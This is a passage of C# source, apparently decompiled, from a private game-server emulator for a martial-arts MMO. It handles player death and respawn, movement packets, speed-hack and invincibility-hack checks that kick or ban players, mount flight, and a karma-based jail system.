				MainForm.WriteLine(100, "更新移动速度() 出错[" + base.Userid + "]-[" + base.UserName + "] " + ex.Message);
			}
		}

		public void 死亡回城(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				byte[] array = new byte[4];
				Buffer.BlockCopy(封包数据, 10, array, 0, 1);
				switch (BitConverter.ToInt32(array, 0))
				{
				case 8:
					if (GM模式 == 8)
					{
						移动(BitConverter.ToSingle(封包数据, 14), BitConverter.ToSingle(封包数据, 22), 15f, base.人物坐标_地图);
						break;
					}
					系统提示("请不要使用无敌外挂，你的ID已被系统记录，多次使用系统会自动封号。");
					MainForm.WriteLine(2, "使用无敌外挂[" + base.Userid + "]-[" + base.UserName + "]");
					if (base.Client != null)
					{
						base.Client.Dispose();
					}
					break;
				case 99:
				{
					if (base.人物坐标_地图 == 42001)
					{
						DataTable dBToDataTable = DBA.GetDBToDataTable("select * from [攻城城主] where 分区信息= '" + World.ZoneNumber + "' ");
						string a = dBToDataTable.Rows[0]["攻城行会名"].ToString();
						byte[] array2 = new byte[4];
						Buffer.BlockCopy(封包数据, 30, array2, 0, 1);
						string 帮派名字 = base.帮派名字;
						if (a == 帮派名字)
						{
							if (BitConverter.ToInt32(array2, 0) == 1)
							{
								base.Player死亡 = false;
								死亡移动(-115f, 461f, 15f, 42001);
								base.人物_HP = base.人物最大_HP;
								更新HP_MP_SP();
								获取复查范围玩家();
								获取复查范围Npc();
								获取复查范围地面物品();
							}
							else
							{
								base.Player死亡 = false;
								死亡移动(-769f, 462f, 15f, 42001);
								base.人物_HP = base.人物最大_HP;
								更新HP_MP_SP();
								获取复查范围玩家();
								获取复查范围Npc();
								获取复查范围地面物品();
							}
							守城城主是否在守城雕像附近();
						}
						else if (BitConverter.ToInt32(array2, 0) == 1)
						{
							base.Player死亡 = false;
							死亡移动(205f, 467f, 15f, 42001);
							base.人物_HP = base.人物最大_HP;
							更新HP_MP_SP();
							获取复查范围玩家();
							获取复查范围Npc();
							获取复查范围地面物品();
						}
						else
						{
							base.Player死亡 = false;
							死亡移动(-430f, -653f, 15f, 42001);
							base.人物_HP = base.人物最大_HP;
							更新HP_MP_SP();
							获取复查范围玩家();
							获取复查范围Npc();
							获取复查范围地面物品();
						}
						dBToDataTable.Dispose();
						break;
					}
					base.Player死亡 = false;
					bool flag = false;
					foreach (坐标Class item in World.移动)
					{
						if (item.Rxjh_Map == base.人物坐标_地图)
						{
							死亡移动(item.Rxjh_X, item.Rxjh_Y, item.Rxjh_Z, item.Rxjh_Map);
							flag = true;
							break;
						}
					}
					if (!flag)
					{
						if (World.老泫勃派开关 == 1)
						{
							死亡移动(495f, 1727f, 15f, 29000);
						}
						else
						{
							死亡移动(529f, 1528f, 15f, 101);
						}
					}
					base.人物_HP = base.人物最大_HP;
					更新HP_MP_SP();
					获取复查范围玩家();
					获取复查范围Npc();
					获取复查范围地面物品();
					break;
				}
				case 1:
				case 100:
				case 102:
				case 105:
					if (base.人物坐标_地图 == 42001)
					{
						for (int i = 0; i < 96; i++)
						{
							if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == 1000001504 && BitConverter.ToInt32(装备栏包裹[i].物品数量, 0) >= 100)
							{
								减去物品(i, 100);
								死亡移动(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
								base.人物_HP = base.人物最大_HP;
								更新HP_MP_SP();
								base.Player死亡 = false;
							}
						}
					}
					else
					{
						死亡移动(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
						base.人物_HP = base.人物最大_HP;
						更新HP_MP_SP();
						base.Player死亡 = false;
					}
					break;
				case 88:
					传送点移动(封包数据, 封包大小);
					break;
				}
				if (PK死亡)
				{
					PK死亡 = false;
					if (无敌时间计数器 != null)
					{
						无敌时间计数器.Enabled = false;
						无敌时间计数器.Close();
						无敌时间计数器.Dispose();
					}
				}
				if (人物灵兽 != null && !人物灵兽.死亡 && 人物灵兽.FLD_ZCD > 100)
				{
					召唤提示(0, 1);
					人物灵兽.人物坐标_X = base.人物坐标_X;
					人物灵兽.人物坐标_Y = base.人物坐标_Y;
					人物灵兽.人物坐标_Z = base.人物坐标_Z;
					人物灵兽.人物坐标_MAP = base.人物坐标_地图;
					召唤更新显示灵兽数据(this);
					更新灵兽HP_MP_SP();
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "死亡回城出错[" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 时间结束事件1(object source, ElapsedEventArgs e)
		{
			Player无敌 = false;
		}

		private void 计算速度(float x, float y)
		{
			int num = (int)DateTime.Now.Subtract(移动时间).TotalMilliseconds;
			移动时间 = DateTime.Now;
			float num2 = x - 上次坐标X;
			float num3 = y - 上次坐标Y;
			float num4 = (float)Math.Sqrt((double)num2 * (double)num2 + (double)num3 * (double)num3) * 1000f / (float)num;
			bool flag = false;
			if (人物灵兽 != null && 人物灵兽.骑 == 1)
			{
				flag = true;
			}
			if ((double)num4 <= (double)最大移动速度 || Speed.ToString("F2") == "正无穷大")
			{
				return;
			}
			yxsl++;
			if (yxsl <= World.三十秒内允许超出次数)
			{
				return;
			}
			switch (World.最大速度超出次数操作)
			{
			case 0:
				MainForm.WriteLine(100, "移动超出最大速度[" + 最大移动速度 + "] 骑宠[" + flag + "] 行走ID[" + 行走状态id + "] 职业[" + base.Player_Job + "] 账号[" + base.Userid + "] 人物[" + base.UserName + "] 当前速度:" + num4.ToString("F2"));
				break;
			case 1:
				MainForm.WriteLine(100, "移动超出最大速度[" + 最大移动速度 + "] 骑宠[" + flag + "] 行走ID[" + 行走状态id + "] 职业[" + base.Player_Job + "] 账号[" + base.Userid + "] 人物[" + base.UserName + "] 当前速度:" + num4.ToString("F2"));
				break;
			case 2:
				MainForm.WriteLine(100, "移动超出最大速度[" + 最大移动速度 + "] 骑宠[" + flag + "] 行走ID[" + 行走状态id + "] 职业[" + base.Player_Job + "] 账号[" + base.Userid + "] 人物[" + base.UserName + "] 当前速度:" + num4.ToString("F2"));
				if (base.Client != null)
				{
					base.Client.Dispose();
				}
				break;
			case 3:
				封号(720, base.Userid, "移动超出最大速度");
				break;
			}
		}

		private void method_16()
		{
			try
			{
				if (自动坐标 == null)
				{
					自动坐标 = new System.Timers.Timer(World.实时移动时间);
					自动坐标.Elapsed += 自动坐标_Elapsed;
					自动坐标.Enabled = true;
					自动坐标.AutoReset = true;
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "计算人物移动坐标出错[" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		private void 自动坐标_Elapsed(object sender, ElapsedEventArgs e)
		{
			try
			{
				method_18(out var float_, out var float_2);
				base.人物坐标_X = float_;
				base.人物坐标_Y = float_2;
				if (自动坐标 != null)
				{
					自动坐标.Enabled = false;
					自动坐标.Close();
					自动坐标.Dispose();
					自动坐标 = null;
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "RefCoordinateCallBack出错[" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		private void method_18(out float float_5, out float float_6)
		{
			try
			{
				float num = 移动中目标坐标X - base.人物坐标_X;
				float num2 = 移动中目标坐标Y - base.人物坐标_Y;
				当前移动距离 = (float)Math.Sqrt(num * num + num2 * num2);
				float num3 = 计算移动速度();
				if (当前移动距离 == 0.0)
				{
					float_5 = 移动中目标坐标X;
					float_6 = 移动中目标坐标Y;
				}
				else
				{
					num *= num3 / (float)当前移动距离;
					num2 *= num3 / (float)当前移动距离;
					float_5 = base.人物坐标_X + num;
					float_6 = base.人物坐标_Y + num2;
				}
				if (当前移动距离 <= (double)num3)
				{
					float_5 = 移动中目标坐标X;
					float_6 = 移动中目标坐标Y;
					当前移动距离 = 0.0;
					if (自动坐标 != null)
					{
						自动坐标.Enabled = false;
						自动坐标.Close();
						自动坐标.Dispose();
						自动坐标 = null;
					}
				}
			}
			catch (Exception ex)
			{
				if (自动坐标 != null)
				{
					自动坐标.Enabled = false;
					自动坐标.Close();
					自动坐标.Dispose();
					自动坐标 = null;
				}
				MainForm.WriteLine(1, "人物移动GET出错[" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
				float_5 = 移动中目标坐标X;
				float_6 = 移动中目标坐标Y;
			}
		}

		private double method_17(Pointx pointx_0, Pointx pointx_1)
		{
			return Math.Sqrt(Math.Pow(Math.Max(pointx_0.x, pointx_1.x) - Math.Min(pointx_0.x, pointx_1.x), 2.0) + Math.Pow(Math.Max(pointx_0.y, pointx_1.y) - Math.Min(pointx_0.y, pointx_1.y), 2.0));
		}

		public float 计算移动速度()
		{
			try
			{
				if (人物灵兽 != null && 人物灵兽.骑 == 1)
				{
					return World.宠物普通走 * (float)(World.实时移动时间 / 10);
				}
				if (行走状态id == 1)
				{
					return World.普通走 * (float)(World.实时移动时间 / 10);
				}
				if (行走状态id == 2)
				{
					return World.轻功一 * (float)(World.实时移动时间 / 10);
				}
				if (行走状态id == 3)
				{
					return World.轻功二 * (float)(World.实时移动时间 / 10);
				}
				if (行走状态id == 5)
				{
					return World.轻功三 * (float)(World.实时移动时间 / 10);
				}
				if (行走状态id == 6)
				{
					return World.韩轻功一 * (float)(World.实时移动时间 / 10);
				}
				if (行走状态id == 7)
				{
					return World.韩轻功二 * (float)(World.实时移动时间 / 10);
				}
				if (行走状态id == 8)
				{
					return World.韩轻功三 * (float)(World.实时移动时间 / 10);
				}
				if (行走状态id == 9)
				{
					return World.韩轻功四 * (float)(World.实时移动时间 / 10);
				}
				return World.普通走 * (float)(World.实时移动时间 / 10);
			}
			catch
			{
				return World.普通走 * (float)(World.实时移动时间 / 10);
			}
		}

		public void 神龙移动(byte[] 封包数据, int 封包大小)
		{
			try
			{
				if (人物灵兽 == null || 飞行模式 == 0)
				{
					return;
				}
				byte[] array = new byte[4];
				byte[] array2 = new byte[4];
				byte[] dst = new byte[4];
				byte[] array3 = new byte[4];
				byte[] array4 = new byte[4];
				byte[] dst2 = new byte[4];
				Buffer.BlockCopy(封包数据, 14, array, 0, 4);
				Buffer.BlockCopy(封包数据, 18, dst, 0, 4);
				Buffer.BlockCopy(封包数据, 22, array2, 0, 4);
				Buffer.BlockCopy(封包数据, 26, array3, 0, 4);
				Buffer.BlockCopy(封包数据, 30, dst2, 0, 4);
				Buffer.BlockCopy(封包数据, 34, array4, 0, 4);
				if (个人商店 != null || base.Player死亡 || base.人物_HP <= 0 || 退出中 || 交易.交易中 || 进店中 || 异常状态.ContainsKey(4) || 异常状态.ContainsKey(27))
				{
					return;
				}
				if (触发地图移动事件)
				{
					yxsl = 0;
				}
				float num = BitConverter.ToSingle(array3, 0);
				float num2 = BitConverter.ToSingle(array4, 0);
				float value = 30f;
				计算速度(num, num2);
				上次坐标X = num;
				上次坐标Y = num2;
				PK死亡 = false;
				Player无敌 = false;
				if (自动攻击 != null)
				{
					自动攻击.Enabled = false;
					自动攻击.Close();
					自动攻击.Dispose();
					自动攻击 = null;
				}
				if (自动恢复 != null)
				{
					自动恢复.Enabled = false;
					自动恢复.Close();
					自动恢复.Dispose();
					自动恢复 = null;
				}
				打坐 = false;
				移动中目标坐标X = BitConverter.ToSingle(array, 0);
				移动中目标坐标Y = BitConverter.ToSingle(array2, 0);
				byte[] array5 = new byte[封包大小];
				Buffer.BlockCopy(封包数据, 0, array5, 0, 封包大小);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array5, 4, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(value), 0, array5, 46, 4);
				array5[6] = 101;
				array5[7] = 0;
				发送当前范围广播数据(array5, array5.Length);
				if (World.开启实时坐标检测 == 1)
				{
					if (移动中目标坐标X != base.人物坐标_X && 移动中目标坐标Y != base.人物坐标_Y)
					{
						method_16();
					}
					double num3 = method_17(new Pointx(num, num2), new Pointx(base.人物坐标_X, base.人物坐标_Y));
					if (World.是否开启实时坐标显示 == 1)
					{
						系统提示("上次坐标:" + (int)base.人物坐标_X + "." + (int)base.人物坐标_Y + "/开始坐标:" + (int)上次坐标X + "." + (int)上次坐标Y + "/目的坐标:" + (int)移动中目标坐标X + "." + (int)移动中目标坐标Y + "/临时坐标:" + (int)num + "." + (int)num2 + "/distance:" + (int)num3 + "/" + (int)DateTime.Now.Subtract(移动时间).TotalMilliseconds + "/行走状态：" + 行走状态id, 9, "系统提示");
					}
					if (num3 >= (double)World.实时检测距离)
					{
						if (自动坐标 != null)
						{
							自动坐标.Enabled = false;
							自动坐标.Close();
							自动坐标.Dispose();
							自动坐标 = null;
						}
						if (World.移动坐标异常后反弹 == 1)
						{
							移动(base.人物坐标_X, base.人物坐标_Y, 15f, base.人物坐标_地图);
							return;
						}
						base.人物坐标_X = num;
						base.人物坐标_Y = num2;
					}
				}
				else
				{
					base.人物坐标_X = num;
					base.人物坐标_Y = num2;
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "神龙移动出错[" + base.Userid + "]-[" + base.UserName + "]" + Converter.ToString(封包数据) + " " + ex.Message);
			}
		}

		public void 人物移动(byte[] 封包数据, int 封包大小)
		{
			try
			{
				byte[] array = new byte[4];
				byte[] array2 = new byte[4];
				byte[] dst = new byte[4];
				byte[] array3 = new byte[4];
				byte[] array4 = new byte[4];
				byte[] dst2 = new byte[4];
				byte[] array5 = new byte[4];
				byte[] dst3 = new byte[4];
				byte[] dst4 = new byte[4];
				byte[] array6 = new byte[4];
				Buffer.BlockCopy(封包数据, 4, array6, 0, 2);
				Buffer.BlockCopy(封包数据, 10, dst3, 0, 4);
				Buffer.BlockCopy(封包数据, 14, array, 0, 4);
				Buffer.BlockCopy(封包数据, 18, dst, 0, 4);
				Buffer.BlockCopy(封包数据, 22, array2, 0, 4);
				Buffer.BlockCopy(封包数据, 26, array3, 0, 4);
				Buffer.BlockCopy(封包数据, 30, dst2, 0, 4);
				Buffer.BlockCopy(封包数据, 34, array4, 0, 4);
				Buffer.BlockCopy(封包数据, 42, array5, 0, 4);
				Buffer.BlockCopy(封包数据, 46, dst4, 0, 4);
				int num = BitConverter.ToInt32(array6, 0);
				if ((double)BitConverter.ToSingle(array5, 0) == 0.0 || num != base.人物全服ID || 个人商店 != null || base.Player死亡 || base.人物_HP <= 0 || 退出中 || 交易.交易中 || 进店中 || 异常状态.ContainsKey(4) || 异常状态.ContainsKey(27))
				{
					return;
				}
				if (触发地图移动事件)
				{
					yxsl = 0;
				}
				float num2 = BitConverter.ToSingle(array3, 0);
				float num3 = BitConverter.ToSingle(array4, 0);
				float value = BitConverter.ToSingle(array5, 0);
				计算速度(num2, num3);
				上次坐标X = num2;
				上次坐标Y = num3;
				PK死亡 = false;
				Player无敌 = false;
				if (自动攻击 != null)
				{
					自动攻击.Enabled = false;
					自动攻击.Close();
					自动攻击.Dispose();
					自动攻击 = null;
				}
				if (自动恢复 != null)
				{
					自动恢复.Enabled = false;
					自动恢复.Close();
					自动恢复.Dispose();
					自动恢复 = null;
				}
				打坐 = false;
				移动中目标坐标X = BitConverter.ToSingle(array, 0);
				移动中目标坐标Y = BitConverter.ToSingle(array2, 0);
				byte[] array7 = new byte[封包大小];
				Buffer.BlockCopy(封包数据, 0, array7, 0, 封包大小);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array7, 4, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(value), 0, array7, 46, 4);
				array7[6] = 101;
				Buffer.BlockCopy(BitConverter.GetBytes(15f), 0, array7, 18, 4);
				发送当前范围广播数据(array7, array7.Length);
				if (World.开启实时坐标检测 == 1)
				{
					if (移动中目标坐标X != base.人物坐标_X && 移动中目标坐标Y != base.人物坐标_Y)
					{
						method_16();
					}
					double num4 = method_17(new Pointx(num2, num3), new Pointx(base.人物坐标_X, base.人物坐标_Y));
					if (World.是否开启实时坐标显示 == 1)
					{
						系统提示("上次坐标:" + (int)base.人物坐标_X + "." + (int)base.人物坐标_Y + "/开始坐标:" + (int)上次坐标X + "." + (int)上次坐标Y + "/目的坐标:" + (int)移动中目标坐标X + "." + (int)移动中目标坐标Y + "/临时坐标:" + (int)num2 + "." + (int)num3 + "/distance:" + (int)num4 + "/" + (int)DateTime.Now.Subtract(移动时间).TotalMilliseconds + "/行走状态：" + 行走状态id, 9, "系统提示");
					}
					if (num4 >= (double)World.实时检测距离)
					{
						if (自动坐标 != null)
						{
							自动坐标.Enabled = false;
							自动坐标.Close();
							自动坐标.Dispose();
							自动坐标 = null;
						}
						if (World.移动坐标异常后反弹 == 1)
						{
							移动(base.人物坐标_X, base.人物坐标_Y, 15f, base.人物坐标_地图);
						}
						else
						{
							base.人物坐标_X = num2;
							base.人物坐标_Y = num3;
						}
					}
				}
				else
				{
					base.人物坐标_X = num2;
					base.人物坐标_Y = num3;
				}
				if (base.人物坐标_地图 == 43001)
				{
					触发人物靠近();
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "人物移动出错[" + base.Userid + "]-[" + base.UserName + "]" + Converter.ToString(封包数据) + " " + ex.Message);
			}
		}

		private double GetDistance(Pointx p1, Pointx p2)
		{
			return Math.Sqrt(Math.Pow(Math.Max(p1.x, p2.x) - Math.Min(p1.x, p2.x), 2.0) + Math.Pow(Math.Max(p1.y, p2.y) - Math.Min(p1.y, p2.y), 2.0));
		}

		private void RefCoordinateCallBack(object sender, ElapsedEventArgs e)
		{
			try
			{
				if (base.人物坐标_X != 目标坐标X && base.人物坐标_Y != 目标坐标Y)
				{
					float x = 0f;
					float y = 0f;
					Get(out x, out y);
					base.人物坐标_X = x;
					base.人物坐标_Y = y;
					if (World.是否开启实时坐标显示 == 1)
					{
						系统提示("坐标X" + x + " 坐标Y" + y, 9, "系统提示");
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "RefCoordinateCallBack出错[" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		private void ExecuteMove()
		{
			try
			{
				if (自动坐标 == null)
				{
					自动坐标 = new System.Timers.Timer(World.实时移动时间);
					自动坐标.Elapsed += RefCoordinateCallBack;
					自动坐标.Enabled = true;
					自动坐标.AutoReset = true;
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "计算人物移动坐标出错[" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		private void Get(out float x, out float y)
		{
			try
			{
				float num = 目标坐标X - base.人物坐标_X;
				float num2 = 目标坐标Y - base.人物坐标_Y;
				double num3 = Math.Atan2(目标坐标Y - base.人物坐标_Y, 目标坐标X - base.人物坐标_X) * 180.0 / Math.PI;
				当前移动距离 = (float)Math.Sqrt(num * num + num2 * num2);
				if (double.IsNaN(当前移动距离))
				{
					当前移动距离 = 0.0;
				}
				float 速度 = 433f / 900f;
				float 速度2 = 0.48f;
				int lx = 0;
				if (num3 >= 0.0)
				{
					lx = 1;
				}
				计算移动速度();
				if (当前移动距离 == 0.0)
				{
					x = 目标坐标X;
					y = 目标坐标Y;
				}
				else
				{
					num *= 速度 / (float)当前移动距离;
					num2 *= 速度2 / (float)当前移动距离;
					x = base.人物坐标_X + num;
					y = base.人物坐标_Y + num2;
				}
				if (是否轻功 == 0 && x != 目标坐标X && y != 目标坐标Y && !打坐刷新移动)
				{
					float value = (float)当前移动距离;
					Buffer.BlockCopy(BitConverter.GetBytes(目标坐标X), 0, 移动封包, 15, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(目标坐标Y), 0, 移动封包, 23, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_X), 0, 移动封包, 27, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Y), 0, 移动封包, 35, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(value), 0, 移动封包, 43, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(value), 0, 移动封包, 47, 4);
					if (行走状态id != 0)
					{
						int value2;
						if (行走状态id == 4)
						{
							value2 = 行走状态id - 2;
							Buffer.BlockCopy(BitConverter.GetBytes(1), 0, 移动封包, 39, 1);
						}
						else
						{
							value2 = 行走状态id - 1;
							Buffer.BlockCopy(BitConverter.GetBytes(1), 0, 移动封包, 39, 1);
						}
						Buffer.BlockCopy(BitConverter.GetBytes(value2), 0, 移动封包, 40, 2);
					}
					发送当前范围广播数据多包(移动封包, 移动封包.Length);
				}
				if (当前移动距离 <= 20.0)
				{
					if (行走状态id == 4)
					{
						是否轻功 = 0;
						行走状态id = 3;
					}
					x = 目标坐标X;
					y = 目标坐标Y;
					当前移动距离 = 0.0;
					if (自动坐标 != null)
					{
						自动坐标.Enabled = false;
						自动坐标.Close();
						自动坐标.Dispose();
						自动坐标 = null;
					}
				}
			}
			catch (Exception ex)
			{
				if (自动坐标 != null)
				{
					自动坐标.Enabled = false;
					自动坐标.Close();
					自动坐标.Dispose();
					自动坐标 = null;
				}
				MainForm.WriteLine(1, "人物移动GET出错[" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
				x = 目标坐标X;
				y = 目标坐标Y;
			}
		}

		public void 人物移动1(byte[] data, int length)
		{
			byte[] array = new byte[4];
			byte[] array2 = new byte[4];
			byte[] dst = new byte[4];
			byte[] array3 = new byte[4];
			byte[] array4 = new byte[4];
			byte[] dst2 = new byte[4];
			byte[] array5 = new byte[4];
			byte[] array6 = new byte[4];
			Buffer.BlockCopy(data, 5, array6, 0, 2);
			Buffer.BlockCopy(data, 15, array, 0, 4);
			Buffer.BlockCopy(data, 19, dst, 0, 4);
			Buffer.BlockCopy(data, 23, array2, 0, 4);
			Buffer.BlockCopy(data, 27, array3, 0, 4);
			Buffer.BlockCopy(data, 31, dst2, 0, 4);
			Buffer.BlockCopy(data, 35, array4, 0, 4);
			Buffer.BlockCopy(data, 43, array5, 0, 4);
			float num = BitConverter.ToSingle(array, 0);
			float num2 = BitConverter.ToSingle(array2, 0);
			float x = BitConverter.ToSingle(array3, 0);
			float y = BitConverter.ToSingle(array4, 0);
			BitConverter.ToSingle(array5, 0);
			int num3 = BitConverter.ToInt32(array6, 0);
			double distance = GetDistance(new Pointx(num, num2), new Pointx(x, y));
			if ((double)num > 99999.0 || (double)num < -99999.0 || (double)num2 > 99999.0 || (double)num2 < -99999.0 || (double)x > 99999.0 || (double)x < -99999.0 || (double)y > 99999.0 || (double)y < -99999.0)
			{
				return;
			}
			if (distance == 0.0)
			{
				if (自动坐标 != null)
				{
					自动坐标.Enabled = false;
					自动坐标.Close();
					自动坐标.Dispose();
					自动坐标 = null;
				}
				return;
			}
			float num4 = num - base.人物坐标_X;
			float num5 = num2 - base.人物坐标_Y;
			float value = (float)Math.Sqrt(num4 * num4 + num5 * num5);
			if (num3 == base.人物全服ID)
			{
				if (个人商店 == null && !base.Player死亡 && !交易.交易中 && !进店中)
				{
					打坐 = false;
					if (自动攻击 != null)
					{
						自动攻击.Enabled = false;
						自动攻击.Close();
						自动攻击.Dispose();
						自动攻击 = null;
					}
					if (自动恢复 != null)
					{
						自动恢复.Enabled = false;
						自动恢复.Close();
						自动恢复.Dispose();
						自动恢复 = null;
					}
					目标坐标X = BitConverter.ToSingle(array, 0);
					目标坐标Y = BitConverter.ToSingle(array2, 0);
					byte[] array7 = new byte[4];
					Buffer.BlockCopy(data, 40, array7, 0, 2);
					int num6 = BitConverter.ToInt32(array7, 0);
					byte[] array8 = new byte[length];
					Buffer.BlockCopy(data, 0, array8, 0, length);
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array8, 5, 2);
					array8[7] = 101;
					Buffer.BlockCopy(BitConverter.GetBytes(15f), 0, array8, 19, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(value), 0, array8, 47, 4);
					发送当前范围广播数据多包(array8, array8.Length);
					if (num6 == 3)
					{
						行走状态id = 4;
					}
					移动封包 = array8;
					base.人物坐标_X = x;
					base.人物坐标_Y = y;
					ExecuteMove();
				}
				return;
			}
			int num7 = (int)DateTime.Now.Subtract(movetime).TotalMilliseconds;
			if (num7 >= 1000)
			{
				movetime = DateTime.Now;
				if (人物灵兽 != null && 人物灵兽.FLD_ZCD > 0)
				{
					人物灵兽.人物坐标_X = BitConverter.ToSingle(array, 0);
					人物灵兽.人物坐标_Y = BitConverter.ToSingle(array2, 0);
				}
				byte[] array9 = new byte[length];
				Buffer.BlockCopy(data, 0, array9, 0, length);
				array9[7] = 101;
				Buffer.BlockCopy(BitConverter.GetBytes(15f), 0, array9, 19, 4);
				if (base.Client != null)
				{
					base.Client.Send(array9, array9.Length);
				}
				发送当前范围广播数据(array9, array9.Length);
			}
		}

		public bool 检查玩家是否在挂机双倍区域(Players playe)
		{
			try
			{
				return playe.人物坐标_地图 == 101 && (double)playe.人物坐标_X < 720.0 && (double)playe.人物坐标_X > -40.0 && (double)playe.人物坐标_Y < 1360.0 && (double)playe.人物坐标_Y > 970.0;
			}
			catch
			{
				return false;
			}
		}

		public void MoveAll(object source, ElapsedEventArgs e)
		{
			int num = 0;
			int num2 = 1;
			int num3 = 1;
			try
			{
				if (World.ArenaIdling != null && World.比武泡点进程 == 1)
				{
					double num4 = 1.0;
					if (!base.Client.挂机 && !base.Client.假人 && !base.Player死亡 && base.人物坐标_地图 == 2341)
					{
						if (检查玩家是否在比武泡点区内(this))
						{
							num4 = 3.0 + base.比武追加经验值;
						}
						if (World.比武场经验基数 != 0.0)
						{
							base.人物经验 += (long)(World.比武场经验基数 * num4);
							更新经验和历练();
						}
						if (World.比武泡点元宝基数 != 0 && (int)DateTime.Now.Subtract(BWYBhmtime).TotalMinutes >= World.比武泡点元宝时间)
						{
							检察元宝数据(Convert.ToInt32((double)World.比武泡点元宝基数 * num4), 1, "比武泡点");
							SaveGemData();
							BWYBhmtime = DateTime.Now;
						}
						if (World.比武泡点金钱基数 != 0)
						{
							base.Player_Money += (uint)((double)World.比武泡点金钱基数 * num4);
							得到钱的提示((uint)((double)World.比武泡点金钱基数 * num4));
							更新金钱和负重();
						}
						if (World.比武泡点武勋基数 != 0)
						{
							base.Player_WuXun += (int)((double)World.比武泡点武勋基数 * num4);
							系统提示("比武泡点获得" + (double)World.比武泡点武勋基数 * num4 + "武勋。");
							更新武功和状态();
						}
					}
				}
				if ((int)DateTime.Now.Subtract(XThmtime).TotalMilliseconds >= World.心跳检测时长)
				{
					times = 0;
					yxsl = 0;
					XThmtime = DateTime.Now;
				}
				if ((int)DateTime.Now.Subtract(TMJCtime).TotalMilliseconds >= 3)
				{
					TMJCtime = DateTime.Now;
					if (base.人物坐标_地图 == 42101 && World.天魔神宫占领者 != base.门派联盟盟主)
					{
						if (World.老泫勃派开关 == 1)
						{
							移动(495f, 1727f, 15f, 29000);
						}
						else
						{
							移动(560f, 1550f, 15f, 101);
						}
						系统提示("天魔神宫不是本同盟门派, 玩家自动传回泫勃派。");
					}
					if (base.人物坐标_地图 == 43001 && 副本复活剩余次数 == 0)
					{
						if (World.老泫勃派开关 == 1)
						{
							移动(495f, 1727f, 15f, 29000);
						}
						else
						{
							移动(560f, 1550f, 15f, 101);
						}
						系统提示("讨伐战副本复活次数用完, 玩家自动传回泫勃派。");
					}
					if (World.老泫勃派开关 == 0 && base.人物坐标_地图 == 29000 && !追加状态列表.ContainsKey(900000204) && !追加状态列表.ContainsKey(900000203))
					{
						移动(560f, 1550f, 15f, 101);
						系统提示("老泫勃派需要佩戴神器, 玩家自动传回泫勃派。");
					}
					if (查询天关地图(base.人物坐标_地图) && !查询天关条件(base.人物坐标_地图))
					{
						if (World.老泫勃派开关 == 1)
						{
							移动(495f, 1727f, 15f, 29000);
						}
						else
						{
							移动(529f, 1528f, 15f, 101);
						}
					}
				}
				num = 1;
				if ((int)DateTime.Now.Subtract(CWhmtime).TotalMinutes >= 15)
				{
					CWhmtime = DateTime.Now;
					if (人物灵兽 != null)
					{
						人物灵兽.FLD_ZCD -= 人物灵兽.FLD_LEVEL * 2;
						num = 2;
						if (人物灵兽.FLD_ZCD <= 100)
						{
							人物灵兽.FLD_ZCD = 0;
							宠物动作(6);
						}
						更新灵兽HP_MP_SP();
					}
				}
				if (World.坐牢系统是否开启 != 0)
				{
					string[] array = World.监狱地图.Trim().Split(',');
					string[] array2 = World.坐牢回城坐标.Trim().Split(',');
					if (base.人物善恶 <= World.坐牢善恶 && base.人物坐标_地图 != int.Parse(array[0]))
					{
						World.发送公告(string.Format(World.坐牢杀人公告, base.UserName));
						移动(int.Parse(array[1]), int.Parse(array[2]), 15f, int.Parse(array[0]));
						系统提示("你的善恶值已经达到" + base.人物善恶 + "强制被送进监狱", 20, "狱警提示");
						系统提示("可以在百宝购买恢复善恶值的道具或者泡点吧", 20, "放出条件");
					}
					if (base.人物坐标_地图 == int.Parse(array[0]))
					{
						if ((int)DateTime.Now.Subtract(JYhmtime).TotalMilliseconds >= World.坐牢善恶恢复间隔 * 60 * 1000)
						{
							base.人物善恶 += World.坐牢恢复善恶值;
							更新武功和状态();
							系统提示("你的善恶值还剩余" + base.人物善恶 + "，善恶值大于零。坐牢结束", 20, "狱警提示");
							JYhmtime = DateTime.Now;
						}
						if (base.人物善恶 >= 0)
						{
							World.发送公告(string.Format(World.刑满释放公告, base.UserName));
							移动(int.Parse(array2[1]), int.Parse(array2[2]), 15f, int.Parse(array2[0]));
							系统提示("希望出去以后改过自新, 期待下次见面O(∩_∩)O~", 20, "狱警提示");
						}
					}
				}
				if ((int)DateTime.Now.Subtract(WXhmtime).TotalMilliseconds >= 5 && base.医生群疗_追加_经验百分比 != 0.0)
				{
					Players players = World.检查玩家世界ID(base.人物全服ID);
					if (players != null)
					{
						if (players.医生群疗_追加_经验百分比 != 0.0)
						{
							players.医生群疗_追加_经验百分比 = 0.0;
						}
						if (players.医生群疗_追加_爆率 != 0)
						{
							players.医生群疗_追加_爆率 = 0;
						}
